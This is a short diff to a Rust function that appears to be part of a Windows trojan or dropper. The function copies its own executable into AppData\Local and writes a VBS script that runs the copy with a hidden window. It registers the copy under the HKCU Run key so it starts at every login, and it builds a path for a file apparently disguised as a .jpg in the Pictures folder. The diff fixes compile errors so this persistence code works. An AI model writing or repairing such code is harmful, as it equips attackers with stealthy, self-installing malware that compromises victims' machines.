@@ -78,8 +78,8 @@ pub fn setup(name: &str) -> Result<()> {
   let home_path = env::home_dir().unwrap().display().to_string();
   let current_path = std::env::current_exe().unwrap().display().to_string();
   let file_name = current_path.split("\\").last().unwrap();
-  let target_path = home_path.clone() + format!("\\AppData\\Local\\{}.exe", str);
-  let vbs_path = home_path.clone() + format!("\\AppData\\Local\\{}.vbs", str);
+  let target_path = home_path.clone() + &format!("\\AppData\\Local\\{}.exe", name);
+  let vbs_path = home_path.clone() + &format!("\\AppData\\Local\\{}.vbs", name);
   let mut image_path = (home_path.clone() + "\\Pictures\\" + file_name).replace(".exe", "");
 
   if !image_path.ends_with(".jpg") {
@@ -115,7 +115,7 @@ pub fn setup(name: &str) -> Result<()> {
       oShell.Run "cmd /c {target_path}", 0, false
       oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\{name}","{target_path}","REG_SZ"
     "#,
-      name = name
+      name = name,
       target_path = target_path
     );
     fs::write(&vbs_path, &vbs_content)?;
